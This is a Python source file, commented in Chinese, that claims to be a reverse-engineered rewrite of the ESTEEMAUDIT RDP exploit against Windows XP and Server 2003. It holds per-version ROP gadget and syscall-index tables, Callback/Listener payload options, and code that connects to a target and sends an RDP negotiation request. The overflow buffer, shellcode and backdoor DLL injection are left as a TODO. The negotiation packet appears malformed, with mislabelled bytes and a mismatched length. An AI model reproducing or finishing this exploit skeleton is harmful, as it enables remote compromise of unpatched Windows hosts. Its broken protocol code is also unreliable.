"""esteem_audit — ESTEEMAUDIT (MS12-020 / ETA) RDP 利用核心逻辑。

Python 重写的 `Esteemaudit-2.1.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 RDP/MS12-020 利用流程。

参数定义来源：Esteemaudit-2.1.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 3389
DEFAULT_TIMEOUT = 60
DEFAULT_PACKET_TIMEOUT = 10
DEFAULT_MAX_PROCESS_COUNT = 300
DEFAULT_RDPLIB_HERTZ = 30
DEFAULT_PROCESS_COUNT_TO_SEND_SPACE = 3
DEFAULT_MAX_RDPLIB_ERROR_COUNT = 3

PAYLOAD_VALUES = {
    "Callback": 0,
    "Listener": 1,
}

ARCHITECTURE_VALUES = {
    "x86": 0,
    "x86 64-bit": 1,
}

# x86 架构下各个目标 OS 的 ROP gadget 地址（来自 XML <Architecture><Target>）
X86_TARGET_GADGETS = {
    "XPSP0": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP1": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP0|1": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE37120,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP2": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE25158,
        "ret10": 0x0FE2AB2D,
        "ret04": 0x0FE27243,
        "ret08": 0x0,
        "ret20": 0x0FE27243,
        "ret28": 0x0,
        "ret40": 0x0FE266B8,
        "ret44": 0x00004000,
        "sysenterIndex": 0x89,
        "jmpEbx": 0x0FE3342A,
        "sizeOffset": 0x44,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP3": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE25158,
        "ret10": 0x0FE2AB2D,
        "ret04": 0x0FE27243,
        "ret08": 0x0,
        "ret20": 0x0FE27243,
        "ret28": 0x0,
        "ret40": 0x0FE266B8,
        "ret44": 0x00004000,
        "sysenterIndex": 0x89,
        "jmpEbx": 0x0FE3342A,
        "sizeOffset": 0x44,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "XPSP2|3": {
        "GlobalBufAddr": 0x0FE370B0,
        "ret0c": 0x0FE25158,
        "ret10": 0x0FE2AB2D,
        "ret04": 0x0FE27243,
        "ret08": 0x0,
        "ret20": 0x0FE27243,
        "ret28": 0x0,
        "ret40": 0x0FE266B8,
        "ret44": 0x00004000,
        "sysenterIndex": 0x89,
        "jmpEbx": 0x0FE3342A,
        "sizeOffset": 0x44,
        "secondStageAddress": 0x0FE372B0,
        "provContAddress": 0x0FF94DB0,
        "scardTransmitAddress": 0x0FE21178,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x11,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x53,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "W2K3SP0": {
        "GlobalBufAddr": 0x0FE380F8,
        "ret0c": 0x0FE38168,
        "ret10": 0x0,
        "ret04": 0x0,
        "ret08": 0x0,
        "ret20": 0x0,
        "ret28": 0x0,
        "ret40": 0x0,
        "ret44": 0x0,
        "sysenterIndex": 0x0,
        "jmpEbx": 0x0,
        "sizeOffset": 0x0,
        "secondStageAddress": 0x0FE382F8,
        "provContAddress": 0x0FF95DF8,
        "scardTransmitAddress": 0x0FE211B4,
        "scardT0PciAddress": 0x0FE211A8,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x12,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x57,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "W2K3SP1": {
        "GlobalBufAddr": 0x080190D8,
        "ret0c": 0x08005E85,
        "ret10": 0x0800BEDD,
        "ret04": 0x08011E7A,
        "ret08": 0x0801118E,
        "ret20": 0x0,
        "ret28": 0x08011FEF,
        "ret40": 0x00004000,
        "ret44": 0x080128CC,
        "sysenterIndex": 0x8F,
        "jmpEbx": 0x08015074,
        "sizeOffset": 0x40,
        "secondStageAddress": 0x080192D8,
        "provContAddress": 0x08176DD8,
        "scardTransmitAddress": 0x0800119C,
        "scardT0PciAddress": 0x080011CC,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x12,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x57,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "W2K3SP2": {
        "GlobalBufAddr": 0x080190D8,
        "ret0c": 0x08005E85,
        "ret10": 0x0800BEDD,
        "ret04": 0x08011E7A,
        "ret08": 0x0801118E,
        "ret20": 0x0,
        "ret28": 0x08011FEF,
        "ret40": 0x00004000,
        "ret44": 0x080128CC,
        "sysenterIndex": 0x8F,
        "jmpEbx": 0x08015074,
        "sizeOffset": 0x40,
        "secondStageAddress": 0x080192D8,
        "provContAddress": 0x08176DD8,
        "scardTransmitAddress": 0x0800119C,
        "scardT0PciAddress": 0x080011CC,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x12,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x57,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
    "W2K3SP1|2": {
        "GlobalBufAddr": 0x080190D8,
        "ret0c": 0x08005E85,
        "ret10": 0x0800BEDD,
        "ret04": 0x08011E7A,
        "ret08": 0x0801118E,
        "ret20": 0x0,
        "ret28": 0x08011FEF,
        "ret40": 0x00004000,
        "ret44": 0x080128CC,
        "sysenterIndex": 0x8F,
        "jmpEbx": 0x08015074,
        "sizeOffset": 0x40,
        "secondStageAddress": 0x080192D8,
        "provContAddress": 0x08176DD8,
        "scardTransmitAddress": 0x0800119C,
        "scardT0PciAddress": 0x080011CC,
        "KiServiceTable_NtAllocateVirtualMemory_Index": 0x12,
        "KiServiceTable_NtAllocateVirtualMemory_ArgSize": 0x18,
        "KiServiceTable_NtFreeVirtualMemory_Index": 0x57,
        "KiServiceTable_NtFreeVirtualMemory_ArgSize": 0x10,
    },
}

# x86 64-bit 架构下各个目标语言包的 ROP gadget 地址
X64_TARGET_GADGETS = {
    "Eng|Jpn|64": {
        "GlobalBufAddr": 0x0FDC9870,
        "ret0c": 0x0FDBE483,
        "ret10": 0x0FDC28CC,
        "ret04": 0x0FDB0EDC,
        "ret08": 0x0FDC2BE7,
        "ret20": 0x0FDBC9C9,
        "ret28": 0x0FDBBE19,
        "ret40": 0x00004000,
        "ret44": 0x0FDBD72D,
        "sysenterIndex": 0x0FF5E2B0,
        "jmpEbx": 0x0FDA43FA,
        "sizeOffset": 0x0FDB9C6D,
        "secondStageAddress": 0x0FDC9A70,
        "provContAddress": 0x0FF5D170,
        "scardTransmitAddress": 0x0FDA1388,
        "scardT0PciAddress": 0x0FDA1370,
    },
    "Other|64": {
        "GlobalBufAddr": 0x0FDA9870,
        "ret0c": 0x0FD9E483,
        "ret10": 0x0FDA28CC,
        "ret04": 0x0FD90EDC,
        "ret08": 0x0FDA2BE7,
        "ret20": 0x0FD9C9C9,
        "ret28": 0x0FD9BE19,
        "ret40": 0x00004000,
        "ret44": 0x0FD9D72D,
        "sysenterIndex": 0x0FF3E2B0,
        "jmpEbx": 0x0FD843FA,
        "sizeOffset": 0x0FD99C6D,
        "secondStageAddress": 0x0FDA9A70,
        "provContAddress": 0x0FF3D170,
        "scardTransmitAddress": 0x0FD81388,
        "scardT0PciAddress": 0x0FD81370,
    },
}


class EsteemAuditError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_rdp_negotiation_request():
    """构建 RDP 协商请求（X.224 Connection Request / MCS Connect Initial）。"""
    # X.224 Connection Request
    x224 = (
        b"\x03\x00"  # Type: Connection Request, Length high
        b"\x00\x1e"  # Length low (30 bytes)
        b"\x00\x00"  # Destination reference
        b"\x00\x00"  # Source reference
        b"\x00"      # Class + options
    )
    # MCS Connect Initial (simplified)
    mcs = (
        b"\x02\x00\x00\x00"  # Calling domain selector, length
        b"\x00\x00"          # Called domain selector
        b"\x00\x00\x00\x00"  # Called address selector
        b"\x00\x00\x00\x00"  # Calling address selector
        b"\x00\x00\x00\x00"  # Target address (optional)
        b"\x00\x00\x00\x00"  # Target domain (optional)
        b"\x00\x00\x00\x00"  # User data (optional)
    )
    return x224 + mcs


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    packet_timeout=DEFAULT_PACKET_TIMEOUT,
    max_process_count=DEFAULT_MAX_PROCESS_COUNT,
    rdplib_hertz=DEFAULT_RDPLIB_HERTZ,
    send_spacebar=True,
    process_count_to_send_space=DEFAULT_PROCESS_COUNT_TO_SEND_SPACE,
    max_rdplib_error_count=DEFAULT_MAX_RDPLIB_ERROR_COUNT,
    payload="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    callin_port=None,
    architecture="x86",
    migrate_process_dll=None,
    callback_payload_dll=None,
    listen_payload_dll=None,
    target_os="XPSP2|3",
    verbose=False,
):
    """执行 ESTEEMAUDIT 利用序列。

    当前阶段：完成参数解析、RDP 连接与协商。
    具体 exploit 缓冲区（RDP 溢出缓冲、ROP 链、shellcode、DLL 注入、
    后门投递等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Packet timeout: {packet_timeout}s")
        print(f"[*] Max process count: {max_process_count}")
        print(f"[*] RdpLib hertz: {rdplib_hertz}")
        print(f"[*] Send spacebar: {send_spacebar}")
        print(f"[*] Payload: {payload}")
        print(f"[*] Architecture: {architecture}")
        print(f"[*] Target OS: {target_os}")

    # 解析常量
    payload_value = PAYLOAD_VALUES[payload]
    arch_value = ARCHITECTURE_VALUES[architecture]

    # 选择 gadget 表
    if architecture == "x86":
        gadgets = X86_TARGET_GADGETS.get(target_os, X86_TARGET_GADGETS["XPSP2|3"])
    else:
        gadgets = X64_TARGET_GADGETS.get(target_os, X64_TARGET_GADGETS["Other|64"])

    if verbose:
        print(f"[*] Payload value: {payload_value}")
        print(f"[*] Arch value: {arch_value}")
        print(f"[*] GlobalBufAddr: 0x{gadgets['GlobalBufAddr']:08X}")
        print(f"[*] JmpEBX: 0x{gadgets['jmpEbx']:08X}")
        print(f"[*] SecondStageAddress: 0x{gadgets['secondStageAddress']:08X}")
        print(f"[*] SizeOffset: 0x{gadgets['sizeOffset']:03X}")

    # 建立 TCP 连接（RDP 3389）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EsteemAuditError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 RDP 协商请求
    negotiation = build_rdp_negotiation_request()
    try:
        sock.sendall(negotiation)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EsteemAuditError(f"RDP 协商失败: {exc}") from exc

    if verbose:
        print(f"[*] RDP 应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - RDP 溢出缓冲（基于 MigrateProcessDLL / CallbackPayloadDLL / ListenPayloadDLL）
    #   - ROP 链（GlobalBufAddr, ret0c..ret44, jmpEbx, sysenterIndex, sizeOffset, 等）
    #   - KiServiceTable 索引（NtAllocateVirtualMemory / NtFreeVirtualMemory）
    #   - Shellcode 注入（secondStageAddress, provContAddress, scardTransmitAddress, scardT0PciAddress）
    #   - Payload: Callback / Listener
    #   - 后门 DLL 注入

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
